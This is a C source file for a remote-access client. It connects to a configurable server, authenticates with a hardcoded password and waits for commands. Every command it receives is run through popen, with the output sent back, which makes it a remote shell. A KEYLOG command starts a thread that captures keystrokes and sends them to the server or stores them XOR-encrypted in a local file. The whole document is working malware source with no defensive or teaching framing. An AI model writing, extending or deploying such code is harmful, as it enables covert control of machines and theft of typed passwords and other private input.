#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <termios.h>
#include <pthread.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>

#define DEFAULT_PORT "27015"
#define DEFAULT_IP "127.0.0.1"
#define BUFFER_SIZE 1024
#define XOR_KEY "mysecretpass1"
#define LOCAL_KEYLOG_FILE "kl_bin"

int sockfd = -1;
int keylogging_enabled = 0;
int local_mode = 0;
FILE *keylog_file = NULL;
pthread_t keylog_thread;

// XOR encryption for local keylogging
void xor_encrypt(const char *input, char *output, size_t len) {
    size_t key_len = strlen(XOR_KEY);
    for (size_t i = 0; i < len; i++) {
        output[i] = input[i] ^ XOR_KEY[i % key_len];
    }
}

// Handle critical errors
void error_exit(const char *message) {
    perror(message);
    exit(EXIT_FAILURE);
}

// Detect available shell
const char* get_shell() {
    if (access("/bin/sh", X_OK) == 0) return "/bin/sh";
    if (access("/bin/bash", X_OK) == 0) return "/bin/bash";
    fprintf(stderr, "Error: Neither /bin/sh nor /bin/bash available.\n");
    exit(EXIT_FAILURE);
}

// Keylogging thread function
void *keylogger(void *arg) {
    struct termios oldt, newt;
    char ch, encrypted_char[1];

    tcgetattr(STDIN_FILENO, &oldt);
    newt = oldt;
    newt.c_lflag &= ~(ICANON | ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);

    printf("Keylogging started.\n");

    while (keylogging_enabled) {
        if (read(STDIN_FILENO, &ch, 1) > 0) {
            if (local_mode) {
                xor_encrypt(&ch, encrypted_char, 1);
                fwrite(encrypted_char, 1, 1, keylog_file);
                fflush(keylog_file);
            } else {
                send(sockfd, &ch, 1, 0);
            }
        }
    }

    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
    printf("Keylogging stopped.\n");
    return NULL;
}

// Start keylogging
void start_keylogging() {
    if (keylogging_enabled) return;
    keylogging_enabled = 1;

    if (local_mode && !keylog_file) {
        keylog_file = fopen(LOCAL_KEYLOG_FILE, "ab");
        if (!keylog_file) {
            perror("Failed to open keylog file");
            keylogging_enabled = 0;
            return;
        }
    }

    if (pthread_create(&keylog_thread, NULL, keylogger, NULL) != 0) {
        perror("Keylogging thread creation failed");
        keylogging_enabled = 0;
    }
}

// Stop keylogging
void stop_keylogging() {
    if (!keylogging_enabled) return;
    keylogging_enabled = 0;
    pthread_join(keylog_thread, NULL);

    if (local_mode && keylog_file) {
        fclose(keylog_file);
        keylog_file = NULL;
    }
}

// Handle server commands
void handle_server_command(const char *command) {
    if (strcmp(command, "KEYLOG") == 0) {
        start_keylogging();
    } else if (strcmp(command, "KEYLOG_STOP") == 0) {
        stop_keylogging();
    } else {
        char output_buffer[BUFFER_SIZE];
        FILE *fp = popen(command, "r");
        if (!fp) {
            snprintf(output_buffer, BUFFER_SIZE, "Error executing command: %s\n", command);
            send(sockfd, output_buffer, strlen(output_buffer), 0);
            return;
        }

        while (fgets(output_buffer, sizeof(output_buffer), fp)) {
            send(sockfd, output_buffer, strlen(output_buffer), 0);
        }
        pclose(fp);

        snprintf(output_buffer, BUFFER_SIZE, "[END_OF_OUTPUT]\n");
        send(sockfd, output_buffer, strlen(output_buffer), 0);
    }
}

// Signal handler for cleanup
void handle_signal(int signal) {
    if (signal == SIGINT || signal == SIGTERM) {
        stop_keylogging();
        if (sockfd != -1) close(sockfd);
        printf("Client terminated.\n");
        exit(EXIT_SUCCESS);
    }
}

int main(int argc, char *argv[]) {
    struct addrinfo hints, *res;
    char server_ip[BUFFER_SIZE] = DEFAULT_IP;
    char server_port[BUFFER_SIZE] = DEFAULT_PORT;
    char password[BUFFER_SIZE] = "mysecretpass1";
    int opt;

    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    while ((opt = getopt(argc, argv, "i:p:w:l")) != -1) {
        switch (opt) {
            case 'i':
                strncpy(server_ip, optarg, BUFFER_SIZE - 1);
                break;
            case 'p':
                strncpy(server_port, optarg, BUFFER_SIZE - 1);
                break;
            case 'w':
                strncpy(password, optarg, BUFFER_SIZE - 1);
                break;
            case 'l':
                local_mode = 1;
                start_keylogging();
                break;
            default:
                fprintf(stderr, "Usage: %s [-i <ip>] [-p <port>] [-w <password>] [-l]\n", argv[0]);
                exit(EXIT_FAILURE);
        }
    }

    if (local_mode) {
        printf("Running in local keylogging mode.\n");
        pause();
        return 0;
    }

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(server_ip, server_port, &hints, &res) != 0) {
        perror("Error resolving server address");
        exit(EXIT_FAILURE);
    }

    sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sockfd < 0) {
        perror("Socket creation failed");
        freeaddrinfo(res);
        exit(EXIT_FAILURE);
    }

    if (connect(sockfd, res->ai_addr, res->ai_addrlen) < 0) {
        perror("Connection to server failed");
        freeaddrinfo(res);
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    freeaddrinfo(res);

    if (send(sockfd, password, strlen(password), 0) < 0) {
        perror("Failed to send password");
        close(sockfd);
        return 1;
    }

    char response[BUFFER_SIZE];
    recv(sockfd, response, BUFFER_SIZE - 1, 0);
    response[BUFFER_SIZE - 1] = '\0';

    if (strcmp(response, "REMOTE_SHELL_CONFIRMED\n") != 0) {
        printf("Authentication failed: %s\n", response);
        close(sockfd);
        return 1;
    }

    printf("Authenticated and connected to server.\n");

    while (1) {
        char command[BUFFER_SIZE];
        ssize_t received = recv(sockfd, command, BUFFER_SIZE - 1, 0);
        if (received <= 0) break;

        command[received] = '\0';
        if (strcmp(command, "terminate") == 0) break;

        handle_server_command(command);
    }

    stop_keylogging();
    close(sockfd);
    return 0;
}